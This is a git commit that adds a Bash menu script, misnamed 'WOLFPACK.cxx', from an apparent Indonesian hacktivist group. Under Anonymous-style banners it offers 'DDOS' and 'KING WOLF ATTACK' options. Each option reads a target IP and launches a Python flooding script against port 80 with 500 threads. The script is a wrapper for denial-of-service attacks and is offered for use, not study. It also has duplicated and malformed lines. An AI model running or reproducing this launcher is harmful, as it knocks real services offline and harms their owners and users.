29bc5ff8c57d95001517f4d0079dce17aed17b25
WolfpackCyber <50273761+WolfpackCyber@users.noreply.github.com>
2019-05-12 11:14:25 +0800

    Add files via upload

---
+++ WOLFPACK.cxx
@@ -0,0 +1,62 @@
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+clear
+toilet -f slant " INDONESIA WOLF CYBER " |lolcat
+toilet -f slant " ☆╰Dzifal╮™ " |lolcat
+echo
+echo
+echo $white"---------------------------------------"
+echo $red"AUTOUR=MISTER ☆╰Dzifal╮™ "
+echo $red"VERSION=1"
+echo $red"WOLF PACK CYBER TEAM"
+echo $white"---------------------------------------"
+echo $green" CYBER ANONYMOUS INDONESIA         "
+echo $red"      WE ARE ANONYMOUS        "echo $green"      WE ARE LEGION        "
+echo $red"      WE DO NOT FOR GIVE       "
+echo $green"     WE DO NOT FORGET        "
+echo $red"          EXPECT US        "
+echo $green"   WOLF PACK CYBER INDONESIA         "
+echo $white"---------------------------------------"
+echo $purple"                 LIST"
+echo $white"---------------------------------------"
+echo $red"[1].DDOS WOLF CYBER"
+echo $red"[2].KING WOLF ATTACK"
+echo $white"---------------------------------------"
+echo $green"TULIS PILIHAN MU"
+read -p "PILIH>>==>" bro;
+echo
+if [ $bro = 1 ] || [ $bro = 1 ]
+then                                                      >
+toilet -f slant " KING WOLF TROJAN " |lolcat
+echo $red"MASUKAN IPNYA"
+read -p "===>" ipt
+clear
+echo
+python win.32.64.NT.py -s$ipt -p80 -t500
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " WOLF CYBER " |lolcat
+echo $red"MASUKAN IP NYA"
+read -p "===>" ipt
+clear
+echo
+echo
+python win.32.64.NT.py -s$ipt -p80 -t500
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+toilet -f slant " KING WOLF " |lolcat
+echo $red"MASUKAN IP NYA"
+read -p "===>" ipt
+clear
+echo
+python andromeda.py -s$ipt -p80 -t500
+fi
